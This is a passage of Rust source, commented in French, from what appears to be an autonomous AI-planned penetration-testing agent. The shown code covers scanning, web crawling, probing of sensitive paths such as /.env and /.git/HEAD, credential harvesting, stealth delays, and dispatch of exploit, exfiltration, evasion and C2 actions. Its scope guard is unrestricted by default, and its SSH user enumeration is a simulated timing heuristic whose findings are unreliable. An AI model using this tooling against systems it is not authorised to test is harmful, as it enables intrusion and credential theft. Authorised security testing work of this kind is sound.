                        "- {:?} {} sur {} [{}] → {}",
                        a.action_type,
                        a.technique,
                        a.target,
                        status,
                        detail.chars().take(600).collect::<String>()
                    )
                })
                .collect::<Vec<_>>()
                .join("\n");

            last_event = Some(events.join(" | "));
            // Bornage du contexte : inutile d'injecter des dizaines de Ko de
            // sortie d'outil dans le prompt du planner.
            last_scan_results = if wave_observation.is_empty() {
                String::new()
            } else {
                wave_observation.chars().take(4000).collect()
            };

            // ── Essaim : consolidation de l'intelligence après la vague ─────
            self.sync_swarm().await;

            // ── Dashboard : publier les agrégats d'apprentissage RL ─────────
            if let Some(ref rl) = self.rl_agent {
                if let Some(ref emitter) = self.dashboard_emitter {
                    let stats = rl.stats();
                    let top_actions = rl
                        .top_actions(5)
                        .into_iter()
                        .map(
                            |(action, avg_q, count)| crate::live_dashboard::RlActionScore {
                                action,
                                avg_q,
                                count,
                            },
                        )
                        .collect();
                    let phases = rl
                        .phase_counts()
                        .into_iter()
                        .map(|(phase, count)| crate::live_dashboard::RlPhaseCount { phase, count })
                        .collect();
                    emitter
                        .send(crate::live_dashboard::DashboardEvent::RlStats {
                            t: chrono::Utc::now().timestamp_millis() as u64,
                            epsilon: stats.epsilon as f64,
                            qtable_entries: stats.qtable_entries,
                            replay_size: stats.replay_size,
                            campaigns_seen: stats.campaigns_seen,
                            top_actions,
                            phases,
                        })
                        .await;
                }
            }

            // Pause stealth entre itérations
            if self.config.stealth_mode {
                let jitter = rand::random::<u64>() % 3000 + 1000;
                tokio::time::sleep(std::time::Duration::from_millis(jitter)).await;
            }
        }

        // Générer le rapport final
        println!("\n📊 Génération du rapport final...");
        let report = self.generate_final_report().await?;
        println!("✅ Rapport sauvegardé.");

        // ── RL : sauvegarder l'apprentissage inter-campagne ──────────────
        if let Some(ref mut rl) = self.rl_agent {
            let stats = rl.stats();
            rl.end_campaign();
            println!(
                "🧠 RL Agent — campagne {} sauvegardée (Q-table: {} entrées, replay: {}, ε={:.3})",
                stats.campaigns_seen + 1,
                stats.qtable_entries,
                stats.replay_size,
                stats.epsilon
            );
        }

        // ── Orchestrateur : synchronisation finale + persistance ─────────
        if let Some(ref orch) = self.orchestrator {
            self.sync_orchestrator(None).await;
            orch.complete().await;
            let path = std::path::Path::new(&self.config.save_dir)
                .join(format!("campaign_state_{}.json", self.config.session_id));
            match orch.save_state(path.to_string_lossy().as_ref()).await {
                Ok(()) => println!("🗺️  État d'orchestration sauvegardé : {}", path.display()),
                Err(e) => eprintln!("⚠️  Sauvegarde de l'état d'orchestration échouée : {}", e),
            }
        }

        Ok(report)
    }

    // ── Synchronisation vers l'orchestrateur de campagne ─────────────────

    /// Réconcilie `CampaignMemory` (source de vérité opérationnelle) vers
    /// `AttackOrchestrator`. Idempotent : les hôtes sont *upsertés* par
    /// identifiant normalisé, et les sessions/credentials déjà présents côté
    /// orchestrateur sont ignorés pour ne pas gonfler artificiellement les
    /// statistiques de campagne.
    async fn sync_orchestrator(&self, plan_phase: Option<&str>) {
        let Some(ref orch) = self.orchestrator else {
            return;
        };

        // ── 1) Hôtes → cibles de campagne ────────────────────────────────
        let mut targets: Vec<CampaignTarget> = Vec::with_capacity(self.memory.hosts.len());
        for (ip, h) in &self.memory.hosts {
            let (service, port) = h
                .services
                .first()
                .map(|s| {
                    let mut it = s.splitn(2, '/');
                    let svc = it.next().unwrap_or("").to_string();
                    let pt = it.next().and_then(|p| p.parse::<u16>().ok()).unwrap_or(0);
                    (svc, pt)
                })
                .unwrap_or_default();
            let risk_score = (h.confirmed_cves.len() as f32 * 2.0).clamp(0.0, 10.0);
            let priority = if risk_score >= 8.0 {
                TargetPriority::Critical
            } else if risk_score >= 6.0 {
                TargetPriority::High
            } else if risk_score >= 4.0 {
                TargetPriority::Medium
            } else {
                TargetPriority::Low
            };
            let status = match h.state {
                HostState::Discovered => TargetStatus::Discovered,
                HostState::Scanned => TargetStatus::Scanned,
                HostState::Vulnerable => TargetStatus::Exploitable,
                HostState::Exploited => TargetStatus::Exploited,
                HostState::Compromised => TargetStatus::Compromised,
                HostState::Pivoting => TargetStatus::Pivoting,
                HostState::Done => TargetStatus::Completed,
            };
            targets.push(CampaignTarget {
                id: normalize_host_key(ip),
                host: ip.clone(),
                port,
                service,
                version: None,
                os: h.os.clone(),
                priority,
                status,
                risk_score,
                cves: h.confirmed_cves.clone(),
                exploited: h.exploit_attempts.values().any(|ok| *ok),
                session_id: h.session_id.clone(),
                lateral_movement_source: matches!(h.state, HostState::Pivoting),
                notes: h.notes.join(" | "),
            });
        }
        orch.add_targets(targets).await;

        // ── 2) Sessions actives → sessions orchestrateur ─────────────────
        let known_sessions: std::collections::HashSet<String> = {
            let st = orch.campaign.read().await;
            st.sessions.keys().cloned().collect()
        };
        for (sid, s) in &self.memory.sessions {
            if known_sessions.contains(sid) {
                continue;
            }
            orch.register_session(crate::orchestrator::ActiveSession {
                session_id: sid.clone(),
                target_id: normalize_host_key(&s.host),
                target_host: s.host.clone(),
                target_port: 0,
                session_type: s.session_type.clone(),
                user: s.username.clone(),
                privileges: s.privileges.clone(),
                system_info: String::new(),
                created_at: s.opened_at.clone(),
                last_activity: s.last_active.clone(),
                alive: s.alive,
                interactive: true,
            })
            .await;
        }

        // ── 3) Credentials récoltés → orchestrateur ──────────────────────
        let known_creds: std::collections::HashSet<String> = {
            let st = orch.campaign.read().await;
            st.harvested_credentials
                .iter()
                .map(|c| c.id.clone())
                .collect()
        };
        for c in &self.memory.credentials {
            if known_creds.contains(&c.id) {
                continue;
            }
            orch.harvest_credential(HarvestedCredential {
                id: c.id.clone(),
                source_host: c.source_host.clone(),
                source_session_id: None,
                credential_type: format!("{:?}", c.cred_type).to_lowercase(),
                username: c.username.clone(),
                domain: c.domain.clone(),
                // OPSEC : l'état d'orchestration est écrit sur disque → jamais
                // de secret en clair (même règle que l'export de campagne).
                secret: mask_secret(&c.secret),
                target_relevance: c.valid_on.clone(),
                harvested_at: c.harvested_at.clone(),
                verified: !c.valid_on.is_empty(),
            })
            .await;
        }

        // ── 4) Phase de campagne ─────────────────────────────────────────
        // La phase annoncée par le LLM prime ; à défaut, on la déduit de
        // l'état réel de la kill-chain (nombre d'hôtes compromis, etc.).
        let sig = StateSignature::from_memory(&self.memory);
        let phase = plan_phase
            .and_then(campaign_phase_from_label)
            .unwrap_or_else(|| campaign_phase_from_killchain(sig.phase));
        orch.set_phase(phase).await;
    }

    // ── Intelligence d'essaim ────────────────────────────────────────────

    /// Fusionne la mémoire locale dans l'intelligence de l'essaim, puis
    /// réimporte les hôtes/credentials connus globalement mais absents
    /// localement. La réimportation est idempotente (clé d'hôte normalisée,
    /// credentials dédupliqués par couple utilisateur/secret) : en mono-agent
    /// elle est sans effet, en multi-agent elle aligne la vue locale sur
    /// l'état consolidé de l'essaim.
    async fn sync_swarm(&mut self) {
        self.swarm
            .sync(&self.memory.hosts, &self.memory.credentials)
            .await;

        let intel = self.swarm.get_global_intel().await;

        // Hôtes connus globalement mais absents localement.
        for (ip, host) in &intel.discovered_hosts {
            if self.memory.hosts.contains_key(ip) {
                continue;
            }
            self.memory.add_host(ip, host.services.clone());
            if !host.confirmed_cves.is_empty() {
                if let Some(h) = self.memory.hosts.get_mut(ip) {
                    h.confirmed_cves = host.confirmed_cves.clone();
                }
                self.memory.update_host_state(ip, HostState::Vulnerable);
            }
            if let Some(sid) = &host.session_id {
                if let Some(h) = self.memory.hosts.get_mut(ip) {
                    h.session_id = Some(sid.clone());
                }
                self.memory.update_host_state(ip, HostState::Compromised);
            }
        }

        // Credentials connus globalement mais absents localement.
        for cred in &intel.credentials {
            self.memory.add_credential(cred.clone());
        }

        if !intel.discovered_hosts.is_empty() {
            println!(
                "   🐝 Essaim — {} hôte(s), {} credential(s), {} cible(s) compromise(s)",
                intel.discovered_hosts.len(),
                intel.credentials.len(),
                intel.pwned_targets.len()
            );
        }
    }

    // ── Agent de découverte autonome ─────────────────────────────────────

    /// Reconnaissance autonome étendue : découverte d'hôtes, fingerprinting
    /// de services et analyse de vulnérabilités. Les vulnérabilités confirmées
    /// sont marquées exploitables dans l'orchestrateur de campagne partagé,
    /// ce qui alimente directement la priorisation LLM/RL.
    ///
    /// Les cibles sont restreintes au périmètre autorisé : aucune sonde ne
    /// sort du scope contractuel (`is_in_scope`).
    async fn run_discovery_agent(&mut self) {
        let targets: Vec<String> = self
            .config
            .initial_targets
            .iter()
            .filter(|t| self.memory.is_in_scope(t.as_str()))
            .cloned()
            .collect();
        if targets.is_empty() {
            return;
        }

        let cfg = DiscoveryAgentConfig {
            max_targets: self.config.initial_targets.len().max(1) * 256,
            aggressive_mode: !self.config.stealth_mode,
            stealth_mode: self.config.stealth_mode,
            llm_enabled: false,
            ..DiscoveryAgentConfig::default()
        };

        let agent = match DiscoveryAgent::new(cfg, None) {
            Ok(a) => a,
            Err(e) => {
                println!("   ⚠️  Agent de découverte indisponible : {}", e);
                return;
            }
        };

        println!(
            "   🔎 Agent de découverte autonome — {} cible(s) en périmètre...",
            targets.len()
        );

        // Le sous-agent ne touche plus la mémoire de campagne : il reçoit un
        // brief borné et rend un `AgentReport`. La promotion (hôtes exploitables,
        // découvertes) est faite ici, par l'orchestrateur.
        for target in targets {
            let brief = AgentBrief {
                role: AgentRole::Recon,
                target: target.clone(),
                objective: format!("Cartographier la surface d'attaque de {}", target),
                hypothesis: None,
                surface_evidence: Vec::new(),
                max_duration_secs: 300,
            };

            let report = agent.run_brief(&brief).await;
            println!("   ✓ Découverte {} — {}", target, report.summary);

            if let Some(orch) = self.orchestrator.clone() {
                for f in &report.findings {
                    if let Some((host, cve)) = f
                        .strip_prefix("exploitable:")
                        .and_then(|rest| rest.split_once(':'))
                    {
                        orch.mark_exploitable(host, cve).await;
                    }
                }
            }

            self.ingest_agent_report(&target, &report);
        }
    }

    // ── Cartographie de la surface d'attaque web ─────────────────────────

    /// Crawl passif de la surface web de chaque hôte HTTP exposé.
    ///
    /// C'est la donnée manquante qui forçait le LLM à se rabattre sur la seule
    /// vulnérabilité qu'il connaissait, la CVE corrélée. Sans inventaire
    /// (formulaires, paramètres, endpoints, indices techno), « tester une SQLi »
    /// reste un mot ; avec lui, le gating du bandit peut distinguer les classes
    /// réellement réalisables et l'agent diversifie ses hypothèses.
    async fn crawl_web_surface(&mut self) {
        let hosts = self.memory.http_hosts();
        if hosts.is_empty() {
            return;
        }
        println!(
            "   🕸️  Cartographie de la surface web — {} hôte(s) HTTP...",
            hosts.len()
        );

        let max_pages = if self.config.stealth_mode { 15 } else { 30 };
        let auth = WebAuth::default();

        for ip in hosts {
            // Idempotence : une surface déjà cartographiée (campagne reprise)
            // n'est pas re-crawlée — on évite le bruit réseau inutile.
            if self
                .memory
                .hosts
                .get(&ip)
                .and_then(|h| h.web_surface.as_ref())
                .is_some()
            {
                continue;
            }
            let (base, _port) = self.memory.host_http_endpoint(&ip);
            let Some(base_url) = base else {
                continue;
            };
            let mut spider = WebSpider::new(
                &base_url,
                max_pages,
                3,
                8,
                std::time::Duration::from_secs(15),
                &auth,
                &[],
                Vec::new(),
            );
            let res = spider.crawl(&base_url).await;

            let surface = WebSurface {
                pages: res.pages.len(),
                forms: res.forms.len(),
                params: collect_surface_params(&res),
                endpoints: collect_surface_endpoints(&res),
                tech_hints: res
                    .pages
                    .iter()
                    .flat_map(|p| p.tech_hints.iter().cloned())
                    .collect::<std::collections::BTreeSet<_>>()
                    .into_iter()
                    .collect(),
                crawled_at: Some(chrono::Utc::now().to_rfc3339()),
            };

            println!(
                "   ✓ {} → {} page(s), {} formulaire(s), {} paramètre(s)",
                ip,
                surface.pages,
                surface.forms,
                surface.params.len()
            );
            self.memory.log(
                "recon",
                "web_crawl",
                Some(&ip),
                "success",
                &format!(
                    "surface: {} pages, {} forms, {} params, {} endpoints",
                    surface.pages,
                    surface.forms,
                    surface.params.len(),
                    surface.endpoints.len()
                ),
                "ai_agent",
            );
            self.memory.set_web_surface(&ip, surface);
        }
        let _ = self.memory.save();
    }

    /// Propose une action `web_attack` déterministe fondée sur la meilleure
    /// hypothèse web non testée d'un hôte HTTP exposé.
    ///
    /// Retourne `None` si aucune classe web applicable n'est disponible (pas de
    /// paramètre/formulaire, ou tout a déjà été testé) : on ne génère jamais
    /// d'action vide qui brûlerait une itération.
    fn propose_web_action(&self) -> Option<PlannedAction> {
        for ip in self.memory.http_hosts() {
            let ev = self.memory.surface_evidence(&ip);
            if !ev.has_http {
                continue;
            }
            let Some((class, p)) = self.memory.hypotheses.best_untried(&ip, &ev) else {
                continue;
            };
            // Ne conserver que les classes traitées par le moteur web.
            if class.action_hint() != "web_attack" {
                continue;
            }
            if self.memory.already_tried(&ip, class.as_str()) {
                continue;
            }

            let target = match self.memory.host_http_endpoint(&ip) {
                (Some(_), port) if port > 0 => format!("{}:{}", ip, port),
                _ => ip.clone(),
            };

            return Some(PlannedAction {
                action_type: ActionType::WebAttack,
                target,
                technique: class.as_str().to_string(),
                tool: "web_attack".to_string(),
                rationale: format!(
                    "Injection proactive : surface web non testée sur cet hôte — hypothèse « {} » (p≈{:.2}).",
                    class.label(), p
                ),
                risk_level: RiskLevel::Medium,
                requires_confirmation: false,
                estimated_success_prob: p as f32,
                fallback: None,
                parameters: HashMap::new(),
            });
        }
        None
    }

    // ── Scan initial ─────────────────────────────────────────────────────

    async fn run_initial_scan(&mut self) -> Result<String> {
        use futures::StreamExt;

        let mut results_summary = String::new();
        let targets = self.config.initial_targets.clone();
        let total = targets.len();

        println!(
            "   Scan de {} cible(s) avec concurrence {}...",
            total, self.config.parallel_scans
        );

        let cve_db = std::sync::Arc::new(self.cve_db.clone());
        let risk_rules = std::sync::Arc::new(self.risk_rules.clone());
        let http_t = self.config.http_timeout;
        let tcp_t = self.config.tcp_timeout;

        let scan_results: Vec<Option<(GraphNode, crate::flows::ScanTargetSummary)>> =
            futures::stream::iter(targets.iter().cloned())
                .map(|t| {
                    let cve = cve_db.clone();
                    let risk = risk_rules.clone();
                    async move {
                        crate::main_helpers::scan_single_target_pub(
                            &t, &cve, &risk, http_t, tcp_t, true,
                        )
                        .await
                    }
                })
                .buffer_unordered(self.config.parallel_scans)
                .collect()
                .await;

        let mut found = 0usize;
        for result in scan_results {
            if let Some((node, summary)) = result {
                found += 1;
                self.memory.add_host(&node.host, node.services.clone());

                if let Some(ref emitter) = self.dashboard_emitter {
                    emitter.send_node(&node).await;
                }

                if node.reachable {
                    self.memory
                        .update_host_state(&node.host, HostState::Scanned);
                }
                if !node.cves.is_empty() {
                    self.memory
                        .update_host_state(&node.host, HostState::Vulnerable);
                    if let Some(h) = self.memory.hosts.get_mut(&node.host) {
                        h.confirmed_cves =
                            node.cves.iter().map(|(id, _, _, _)| id.clone()).collect();
                        h.os = Some(node.product.clone());
                        h.notes
                            .push(format!("banner={}", truncate_chars(&node.banner, 80)));
                    }
                    results_summary.push_str(&format!(
                        "VULN {}:{} services={} cves={} risk={}\n",
                        node.host,
                        node.port,
                        node.services.join(","),
                        node.cves
                            .iter()
                            .map(|(id, _, _, _)| id.as_str())
                            .collect::<Vec<_>>()
                            .join(","),
                        node.risk
                    ));
                } else if node.reachable {
                    results_summary.push_str(&format!(
                        "OPEN {}:{} services={} risk={}\n",
                        node.host,
                        node.port,
                        node.services.join(","),
                        node.risk
                    ));
                }
            }
        }

        println!("   ✓ {}/{} hôtes répondants", found, total);
        self.memory.stats.hosts_discovered = self.memory.hosts.len();
        Ok(results_summary)
    }

    // ── Exécution d'une action planifiée ─────────────────────────────────

    /// Dispatch pur d'une action vers son module : aucune confirmation, aucun
    /// contrôle de périmètre, aucune journalisation, aucune récompense.
    ///
    /// Extrait de `execute_action` pour pouvoir l'encadrer d'un plafond dur
    /// (`tokio::time::timeout`) — le futur annulé doit être « nu » pour que
    /// l'abandon ne court-circuite pas le bookkeeping.
    async fn dispatch_action(&mut self, action: &PlannedAction) -> Result<String> {
        match action.action_type {
            ActionType::Scan => self.action_scan(action).await,
            ActionType::Enumerate => self.action_enumerate(action).await,
            ActionType::Exploit => self.action_exploit(action).await,
            ActionType::BruteForce => self.action_brute_force(action).await,
            ActionType::CredentialReuse => self.action_credential_reuse(action).await,
            ActionType::PostExploit => self.action_post_exploit(action).await,
            ActionType::Pivot => self.action_pivot(action).await,
            ActionType::Report => self.action_generate_report(action).await,
            ActionType::Pause => {
                println!("   ⏸️  Pause demandée par l'IA...");
                tokio::time::sleep(std::time::Duration::from_secs(5)).await;
                Ok("paused".to_string())
            }
            ActionType::Complete => Ok(format!("{:?} noted", action.action_type)),
            ActionType::Cleanup => self.action_cleanup(action).await,
            ActionType::Exfiltrate => self.action_exfiltrate(action).await,
            ActionType::Evasion => self.action_evasion(action).await,
            ActionType::AdversaryEmulation => self.action_adversary_emulation(action).await,
            ActionType::StressTest => self.action_stress_test(action).await,
            ActionType::WebAttack => self.action_web_attack(action).await,
            ActionType::AdvancedScan => {
                let host = extract_host(&action.target);
                let result = self.action_enumerate_advanced(&host).await;
                Ok(result)
            }
            ActionType::KerberosAttack => self.action_kerberos(action).await,
            ActionType::HordeAttack => self.action_horde(action).await,
            ActionType::AdAttack => self.action_ad_attack(action).await,
            ActionType::Osint => self.action_osint(action).await,
            ActionType::IotScada => self.action_iot_scada(action).await,
            ActionType::C2 => self.action_c2(action).await,
            ActionType::Integration => self.action_integration(action).await,
            ActionType::ExternalTool => self.action_external_tool(action).await,
        }
    }

    pub async fn execute_action(&mut self, action: &PlannedAction) -> Result<String> {
        // Confirmation humaine si nécessaire
        if action.requires_confirmation || self.config.confirm_all {
            if !self.ask_human_confirmation(action)? {
                self.memory.stats.human_rejections += 1;
                self.memory.log(
                    "confirm",
                    &format!("{:?}", action.action_type),
                    Some(&action.target),
                    "rejected",
                    &format!("Opérateur a refusé : {}", action.technique),
                    "human",
                );
                // Pénalisation : un rejet vaut un échec. Sans cela le LLM peut
                // re-proposer indéfiniment la même action refusée, le garde-fou
                // anti-boucle s'appuyant sur `failed_attempts`.
                self.record_blocked_attempt(action);
                return Ok(format!("REJECTED:{}", action.technique));
            }
            self.memory.stats.human_confirmations += 1;
        }

        // ── Garde-fou de périmètre (p2a) : aucune action dirigée vers une cible
        // hors scope. Le périmètre est vide par défaut (aucune restriction).
        if action.target != "all" {
            let scope_host = extract_host(&action.target);
            if !scope_host.is_empty() && !self.memory.is_in_scope(&scope_host) {
                println!("   🚫 Hors périmètre : {} — action refusée", scope_host);
                self.memory.log(
                    "scope",
                    &format!("{:?}", action.action_type).to_lowercase(),
                    Some(&action.target),
                    "rejected",
                    &format!(
                        "Cible {} hors du périmètre autorisé — action bloquée",
                        scope_host
                    ),
                    "ai_agent",
                );
                self.record_blocked_attempt(action);
                return Ok(format!(
                    "OUT_OF_SCOPE:{}@{}",
                    action.technique, action.target
                ));
            }
        }

        println!(
            "\n▶️  Exécution : {:?} sur {} via {}",
            action.action_type, action.target, action.technique
        );

        // ── Plafond dur par action ──────────────────────────────────────────
        // Un module peut rester bloqué indéfiniment (constaté : le module
        // WebAttack suit une redirection vers une origine TLS en tarpit et
        // consomme un timeout réseau par sonde → agent figé). On borne donc
        // chaque action ; en cas de dépassement elle est annulée puis traitée
        // comme un échec ordinaire, ce qui laisse la boucle de décision
        // progresser au lieu de se figer.
        let timeout_secs = self.config.action_timeout_secs;
        let result: Result<String> = match tokio::time::timeout(
            std::time::Duration::from_secs(timeout_secs),
            self.dispatch_action(action),
        )
        .await
        {
            Ok(r) => r,
            Err(_) => {
                println!(
                    "   ⏱️  Timeout : {:?} interrompue après {}s — action abandonnée",
                    action.action_type, timeout_secs
                );
                Err(anyhow::anyhow!(
                    "action {:?} interrompue après {}s (plafond dur)",
                    action.action_type,
                    timeout_secs
                ))
            }
        };

        let event = match result {
            Ok(ref r) => {
                // Découpe par CARACTÈRES (et non par octets) : les messages de
                // résultat sont en français et un slice `[..120]` tombant au
                // milieu d'un caractère multi-octets (é, ô, è) paniquerait.
                println!(
                    "   ✅ Résultat : {}",
                    r.chars().take(120).collect::<String>()
                );
                self.memory.log(
                    &format!("{:?}", action.action_type).to_lowercase(),
                    &action.technique,
                    Some(&action.target),
                    "success",
                    r,
                    "ai_agent",
                );
                format!("SUCCESS:{}@{}:{}", action.technique, action.target, r)
            }
            Err(ref e) => {
                println!("   ❌ Échec : {}", e);
                // Levier C : clé d'hôte unifiée (sans port) — cohérent avec
                // action_exploit() et avec already_tried().
                self.memory.record_exploit_attempt(
                    &extract_host(&action.target),
                    &action.technique,
                    false,
                );
                self.memory.log(
                    &format!("{:?}", action.action_type).to_lowercase(),
                    &action.technique,
                    Some(&action.target),
                    "failure",
                    &e.to_string(),
                    "ai_agent",
                );
                format!("FAILURE:{}@{}:{}", action.technique, action.target, e)
            }
        };

        Ok(event)
    }

    /// Enregistre une action bloquée (rejet humain ou hors périmètre) comme
    /// tentative échouée. Alimente le garde-fou anti-boucle `already_tried()` et
    /// le contexte LLM (`failed_techniques_by_host`), afin qu'une action refusée
    /// ne soit pas re-proposée à l'itération suivante.
    fn record_blocked_attempt(&mut self, action: &PlannedAction) {
        let host = extract_host(&action.target);
        if host.is_empty() || host == "all" {
            return;
        }
        self.memory
            .record_exploit_attempt(&host, &action.technique, false);
    }

    // ── Actions spécialisées ─────────────────────────────────────────────

    async fn action_scan(&mut self, action: &PlannedAction) -> Result<String> {
        // Scan piloté par le moteur `netscan` (inspiré de nmap) : balayage
        // multi-ports, SYN brut si privilèges suffisants, puis enrichissement
        // de chaque port ouvert (bannière, CPE, corrélation CVE, risque).
        //
        // Avant, l'action ne sondait que le seul port de la cible : dès que ce
        // port était filtré (cas vécu : 443 en tarpit alors que 22/80 sont
        // ouverts), l'agent concluait « 0 hôte découvert » et ne voyait jamais
        // la surface d'attaque réelle.
        use crate::netscan::{self, PortState, TimingTemplate};
        use std::net::IpAddr;

        let targets = crate::main_helpers::expand_target_pub(&action.target);
        if targets.is_empty() {
            return Ok("Scan ignoré : cible vide".to_string());
        }
        println!("   🔍 Scan netscan de {} cible(s)...", targets.len());

        // Profil de timing : furtif si la campagne l'exige, agressif sinon.
        let timing = if self.config.stealth_mode {
            TimingTemplate::Polite
        } else {
            TimingTemplate::Aggressive
        };
        let params = timing.params();
        let use_syn = netscan::syn_scan_supported() && netscan::raw_sockets_usable();
        let technique = if use_syn { "syn" } else { "connect" };

        // Ports balayés : liste « top ports » type nmap, complétée par le port
        // explicitement visé s'il n'y figure pas déjà.
        let mut scan_ports = netscan::top_ports();
        if let Some(p) = extract_port(&action.target) {
            if !scan_ports.contains(&p) {
                scan_ports.push(p);
            }
        }

        let mut found: Vec<String> = Vec::new();
        let mut open_total = 0usize;

        for t in &targets {
            let host = extract_host(t);

            // 1) Découverte de ports par le moteur netscan.
            let open_ports: Vec<u16> = match host.parse::<IpAddr>() {
                Ok(ip) => {
                    let results = if use_syn {
                        netscan::syn_scan(ip, &scan_ports, &params).await
                    } else {
                        netscan::connect_scan(ip, &scan_ports, &params).await
                    };
                    results
                        .into_iter()
                        .filter(|r| r.state == PortState::Open)
                        .map(|r| r.port)
                        .collect()
                }
                Err(_) => Vec::new(),
            };
            open_total += open_ports.len();

            // Repli : si le balayage n'a rien vu, on tente au moins le port
            // explicitement visé (comportement historique).
            let ports_to_probe: Vec<u16> = if open_ports.is_empty() {
                extract_port(t).into_iter().collect()
            } else {
                open_ports.clone()
            };

            // 2) Enrichissement par port : bannière, CPE, CVE, scoring de
            //    risque et émission dashboard.
            for p in ports_to_probe {
                let target = format!("{host}:{p}");
                if let Some((node, _)) = crate::main_helpers::scan_single_target_pub(
                    &target,
                    &self.cve_db,
                    &self.risk_rules,
                    self.config.http_timeout,
                    self.config.tcp_timeout,
                    true,
                )
                .await
                {
                    self.memory.add_host(&node.host, node.services.clone());
                    if let Some(ref emitter) = self.dashboard_emitter {
                        emitter.send_node(&node).await;
                    }
                    // Un port déclaré `Open` par netscan est une ouverture TCP
                    // RÉELLE, même si aucune bannière applicative n'est capturée
                    // (service silencieux, HTTP sur port non standard). Se fier
                    // uniquement à `node.reachable` — qui exige une bannière ou
                    // un statut HTTP — écartait ces ports et sous-estimait la
                    // surface d'attaque (constaté : 3 ports ouverts, 1 seul listé).
                    if node.reachable || open_ports.contains(&p) {
                        self.memory
                            .update_host_state(&node.host, HostState::Scanned);
                        if node.reachable {
                            found.push(format!(
                                "{}:{} ({})",
                                node.host,
                                node.port,
                                node.services.join("/")
                            ));
                        } else {
                            found.push(format!(
                                "{}:{} (ouvert, sans bannière)",
                                node.host, node.port
                            ));
                        }
                    }
                }
            }
        }

        Ok(format!(
            "Balayage {technique} : {} port(s) ouvert(s) sur {} testé(s) ; hôtes exploitables : {}",
            open_total,
            scan_ports.len(),
            if found.is_empty() {
                "aucun".to_string()
            } else {
                found.join(", ")
            }
        ))
    }

    async fn action_enumerate(&mut self, action: &PlannedAction) -> Result<String> {
        let host = extract_host(&action.target);
        let port = extract_port(&action.target).unwrap_or(80);

        println!(
            "   🔎 Énumération {} sur {}:{}...",
            action.technique, host, port
        );

        // Enumération SSH users via technique timing
        if action.technique.contains("CVE-2018-15473") || action.technique.contains("ssh_enum") {
            let common_users = [
                "root", "admin", "user", "ubuntu", "debian", "backup", "www-data", "svc",
                "service", "test", "guest",
            ];
            let mut found_users = Vec::new();
            for u in &common_users {
                // Simulation timing-based enum (probe SSH avec username invalide vs valide)
                let start = std::time::Instant::now();
                let _ = tokio::time::timeout(
                    std::time::Duration::from_millis(800),
                    tokio::net::TcpStream::connect(format!("{}:{}", host, port)),
                )
                .await;
                let elapsed = start.elapsed().as_millis();
                // Heuristique simple : si réponse < 200ms, user probable (timing diff)
                if elapsed < 400 {
                    found_users.push(*u);
                }
            }
            if !found_users.is_empty() {
                if let Some(h) = self.memory.hosts.get_mut(&host) {
                    h.notes.push(format!("ssh_users={}", found_users.join(",")));
                }
                return Ok(format!(
                    "Utilisateurs SSH potentiels trouvés : {}",
                    found_users.join(", ")
                ));
            }
        }

        // Enumération HTTP (chemins, répertoires) — couvre aussi les techniques
        // de directory busting et de recherche de mauvaise configuration
        // (`dir_bust`, `misconfig`, `bust`, `dir`) que le LLM planifie. Sans
        // cette prise en charge, elles ne matchaient aucune branche et
        // retombaient sur « pas de résultat notable » : le busting n'était
        // jamais réellement exécuté.
        let t = action.technique.to_lowercase();
        if t.contains("http")
            || t.contains("web")
            || t.contains("dir")
            || t.contains("bust")
            || t.contains("misconfig")
            || t.contains("enum")
        {
            // Base réelle : préférer l'endpoint HTTP mémorisé (schéma + port
            // corrects) au lieu du port deviné.
            let (memo_base, memo_port) = self.memory.host_http_endpoint(&host);
            let base = memo_base.unwrap_or_else(|| {
                format!(
                    "http://{}:{}",
                    host,
                    if memo_port == 0 { port } else { memo_port }
                )
            });

            let paths = [
                "/admin",
                "/login",
                "/api",
                "/.git/HEAD",
                "/backup",
                "/.env",
                "/config",
                "/server-status",
                "/phpinfo.php",
                "/robots.txt",
                "/sitemap.xml",
                "/uploads/",
                "/files/",
                "/db/",
                "/database/",
                "/.htaccess",
                "/wp-admin/",
                "/wp-login.php",
                "/administrator/",
                "/manager/html",
            ];
            // Ne pas suivre les redirections : sur une cible qui redirige tout
            // vers un HTTPS injoignable, suivre la redirection produirait un
            // timeout par requête (≈20 × timeout) sans rien apprendre.
            let client = reqwest::Client::builder()
                .timeout(std::time::Duration::from_secs(4))
                .danger_accept_invalid_certs(true)
                .redirect(reqwest::redirect::Policy::none())
                .build()?;

            // Référence : réponse de la racine, pour écarter les redirections
            // « attrape-tout » (tous les chemins renvoient le même 3xx).
            let root_status = client
                .get(base.as_str())
                .send()
                .await
                .ok()
                .map(|r| r.status().as_u16());

            let mut found_paths = Vec::new();
            for path in &paths {
                let url = format!("{}{}", base.trim_end_matches('/'), path);
                if let Ok(resp) = client.get(&url).send().await {
                    let status = resp.status().as_u16();
                    if status == 404 || status == 400 {
                        continue;
                    }
                    if Some(status) == root_status && (300..400).contains(&status) {
                        continue; // redirection générique, pas une découverte
                    }
                    found_paths.push(format!("{} ({})", path, status));
                }
            }

            if found_paths.is_empty() {
                return Ok(format!(
                    "Énumération HTTP sur {} : aucun chemin notable",
                    base
                ));
            }
            if let Some(h) = self.memory.hosts.get_mut(&host) {
                h.notes
                    .push(format!("http_paths={}", found_paths.join(",")));
            }
            return Ok(format!("Paths HTTP trouvés : {}", found_paths.join(", ")));
        }

        // ── Scan protocoles avancés si la technique le demande ──────────────
        let tech_lower = action.technique.to_lowercase();
        if tech_lower.contains("snmp")
            || tech_lower.contains("ipmi")
            || tech_lower.contains("k8s")
            || tech_lower.contains("kubernetes")
            || tech_lower.contains("rpc")
            || tech_lower.contains("advanced")
        {
            let result = self.action_enumerate_advanced(&host).await;
            return Ok(result);
        }

        Ok(format!(
            "Énumération {} terminée (pas de résultat notable)",
            action.technique
        ))
    }

    /// Énumération avancée des protocoles réseau (SNMP, IPMI, K8s, MS-RPC)
    async fn action_enumerate_advanced(&mut self, host: &str) -> String {
        println!("   🔬 Scan protocoles avancés sur {}...", host);
        let results = crate::network_advanced::scan_all_advanced(host).await;
        let mut summary = Vec::new();
        for r in &results {
            if r.vulnerable {
                for f in &r.findings {
                    if let Some(h) = self.memory.hosts.get_mut(host) {
                        h.notes
                            .push(format!("[{}] {} CVSS={:.1}", r.protocol, f.title, f.cvss));
                        if f.cvss >= 9.0 {
                            h.state = HostState::Vulnerable;
                        }
                    }
                    summary.push(format!("{}: {} (CVSS {:.1})", r.protocol, f.title, f.cvss));
                    if !f.exploit_cmd.is_empty() {
                        println!("   \x1b[90m  → {}\x1b[0m", f.exploit_cmd[0]);
                    }
                }
            }
        }
        if summary.is_empty() {
            format!("Scan avancé {} — aucun protocole vulnérable", host)
        } else {
            format!(
                "Scan avancé {} — {} findings: {}",
